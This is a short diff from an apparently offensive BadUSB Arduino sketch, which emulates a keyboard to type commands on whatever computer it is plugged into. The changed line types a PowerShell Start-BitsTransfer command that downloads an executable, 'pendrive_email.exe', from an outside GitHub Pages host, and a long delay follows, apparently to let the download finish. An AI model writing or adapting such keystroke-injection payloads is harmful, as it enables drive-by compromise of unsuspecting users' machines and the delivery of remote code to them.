@@ -15,7 +15,7 @@ Keyboard.press(KEY_RETURN);
 Keyboard.releaseAll();
 delay(1000);
 
-Keyboard.print("Start-BitsTransfer -Source https://hassagi.github.io/test/pendrive_email.exe");
+Keyboard.print("Start-BitsTransfer -Source https://hassagi.github.io/BadUSB/pendrive_email.exe");
 Keyboard.press(KEY_RETURN);
 Keyboard.releaseAll();
 delay(17000);
